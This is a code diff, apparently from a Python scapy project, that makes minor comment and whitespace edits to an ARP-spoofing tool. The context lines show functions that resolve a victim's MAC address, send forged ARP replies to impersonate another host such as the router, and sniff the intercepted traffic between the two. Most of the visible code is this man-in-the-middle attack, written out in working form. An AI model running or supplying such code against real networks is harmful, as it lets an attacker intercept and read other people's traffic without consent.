@@ -5,7 +5,7 @@ import time
 init(autoreset=True)  # Initialize colorama for colored output
 
 def GetMacFromIP(ip):
-        # Sends an ARP request to retrieve the MAC address of the specified IP
+    # Sends an ARP request to retrieve the MAC address of the target IP
     arp_request = scapy.ARP(pdst=ip)
     broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
     arp_request_broadcast = broadcast / arp_request
@@ -22,7 +22,7 @@ def spoof_router(target_ip,target_mac, spoofed_ip):
     ether = scapy.Ether(dst=target_mac)  # Ethernet destination
     arp = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoofed_ip)
 
-    packet = ether / arp
+    packet = ether / arp 
     scapy.sendp(packet, verbose=False)
 
     print(Fore.YELLOW + f"[+] Spoofing {target_ip} pretending to be {spoofed_ip}")
@@ -34,7 +34,7 @@ def catch_packets(target_ip,spoofed_ip):
         filter=f"host {target_ip} and host {spoofed_ip}",
         store=False,
         count=5,
-        prn=lambda pkt: print(pkt.summary())
+        prn=lambda pkt: print(pkt.summary())  # NOTE: This is where intercepted packets are printed
     )
 
 
